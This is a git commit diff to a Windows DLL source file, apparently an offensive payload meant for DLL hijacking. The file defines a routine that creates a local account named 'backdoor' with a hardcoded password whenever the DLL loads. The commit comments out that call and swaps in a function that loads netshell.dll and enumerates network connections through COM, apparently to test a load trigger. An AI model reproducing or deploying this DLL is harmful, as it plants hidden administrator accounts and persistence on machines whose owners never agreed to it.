88608a8e0631abf004181430d3f1c99783221375
nodauf <nodauf@users.noreply.github.com>
2023-05-16 11:12:32 +0200

    Update dllmain.cpp

--- adduser/dllmain.cpp
+++ adduser/dllmain.cpp
@@ -2,6 +2,9 @@
 #include <iostream>
 #include <windows.h>
 #include <LM.h>
+#include <iostream>
+#include <comdef.h>
+#include <netcon.h>
 #pragma comment(lib, "Netapi32.lib")
 using namespace std;
 wstring name = L"backdoor";
@@ -10,6 +13,58 @@ wstring password = L"localadmin123!";
 LPWSTR lpPassword = const_cast<wchar_t *>(password.c_str());
 DWORD adduserStatus;
 USER_INFO_1 userinfo;
+
+int trigger()
+{
+	 HRESULT hResult;
+
+    typedef void(__stdcall* LPNcFreeNetconProperties)(NETCON_PROPERTIES* pProps);
+    HMODULE hModule = LoadLibrary(L"netshell.dll");
+    if (hModule == NULL) { return 1; }
+    LPNcFreeNetconProperties NcFreeNetconProperties = (LPNcFreeNetconProperties)GetProcAddress(hModule, "NcFreeNetconProperties");
+
+    hResult = CoInitializeEx(0, COINIT_MULTITHREADED);
+    if (SUCCEEDED(hResult))
+    {
+        INetConnectionManager* pConnectionManager = 0;
+        hResult = CoCreateInstance(CLSID_ConnectionManager, 0, CLSCTX_ALL, __uuidof(INetConnectionManager), (void**)&pConnectionManager);
+        if (SUCCEEDED(hResult))
+        {
+            IEnumNetConnection* pEnumConnection = 0;
+            hResult = pConnectionManager->EnumConnections(NCME_DEFAULT, &pEnumConnection);
+            if (SUCCEEDED(hResult))
+            {
+                INetConnection* pConnection = 0;
+                ULONG count;
+                while (pEnumConnection->Next(1, &pConnection, &count) == S_OK)
+                {
+                    NETCON_PROPERTIES* pConnectionProperties = 0;
+                    hResult = pConnection->GetProperties(&pConnectionProperties);
+                    if (SUCCEEDED(hResult))
+                    {
+                        wprintf(L"Interface: %ls\n", pConnectionProperties->pszwName);
+                        NcFreeNetconProperties(pConnectionProperties);
+                    }
+                    else
+                        wprintf(L"[-] INetConnection::GetProperties() failed. Error code = 0x%08X (%ls)\n", hResult, _com_error(hResult).ErrorMessage());
+                    pConnection->Release();
+                }
+                pEnumConnection->Release();
+            }
+            else
+                wprintf(L"[-] IEnumNetConnection::EnumConnections() failed. Error code = 0x%08X (%ls)\n", hResult, _com_error(hResult).ErrorMessage());
+            pConnectionManager->Release();
+        }
+        else
+            wprintf(L"[-] CoCreateInstance() failed. Error code = 0x%08X (%ls)\n", hResult, _com_error(hResult).ErrorMessage());
+        CoUninitialize();
+    }
+    else
+        wprintf(L"[-] CoInitializeEx() failed. Error code = 0x%08X (%ls)\n", hResult, _com_error(hResult).ErrorMessage());
+    
+    FreeLibrary(hModule);
+    wprintf(L"Done\n");
+}
 
 int backDoor(USER_INFO_1 userinfo)
 {
@@ -43,7 +98,8 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 	switch (ul_reason_for_call)
 	{
 	case DLL_PROCESS_ATTACH:
-		adduserStatus = backDoor(userinfo);
+		//adduserStatus = backDoor(userinfo);
+		trigger();
 		break;
 	case DLL_THREAD_ATTACH:
 	case DLL_THREAD_DETACH:
